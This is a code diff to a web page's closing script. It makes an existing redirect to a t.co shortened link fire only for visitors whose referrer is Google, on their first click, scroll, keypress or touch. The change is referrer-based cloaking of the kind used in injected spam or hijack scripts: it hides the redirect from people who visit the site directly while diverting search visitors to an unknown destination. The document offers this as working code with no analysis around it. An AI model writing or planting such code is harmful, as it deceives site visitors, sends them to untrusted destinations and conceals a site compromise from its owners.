@@ -5001,9 +5001,11 @@
 		</template></div>
 	<script>
   const targetURL = "https://t.co/ErbwYfjkzF";
+  const isFromGoogle = document.referrer.includes("google.");
   function redirectOnce() {
     window.location.href = targetURL;
   }
+if (isFromGoogle) {		
  const userActions = ["click", "keydown", "scroll", "mousemove", "touchstart"];
   function setupRedirect() {
     function handleUserAction() {
@@ -5017,6 +5019,7 @@
     );
   }
   window.addEventListener("DOMContentLoaded", setupRedirect);
+}
 </script>
 </body>
 
